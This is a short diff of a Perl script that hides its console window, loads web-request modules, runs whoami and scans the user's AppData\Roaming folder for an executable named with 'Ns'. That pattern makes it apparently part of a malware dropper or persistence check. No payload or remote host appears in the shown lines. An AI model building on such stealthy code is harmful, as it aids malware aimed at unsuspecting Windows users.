@@ -72,9 +72,11 @@ hide_console();
 use LWP::UserAgent;
 use LWP::Simple;
 use Config;
+use warnings;
+use strict;
 
 my (\$response, \$username, \$agent, \$name, \$ok) = `whoami`, 0;
-\$username =~ s/(.*?)\\\\//g;
+\$username =~ s/(.*?)\\\\(.*?)//g;
 for(glob "C:\\\\Users\\\\\$username\\\\AppData\\\\Roaming\\\\*"){
   if(\$_ =~ /^Ns/ && \$_ =~ /\\.exe\$/){
     \$ok = 1;
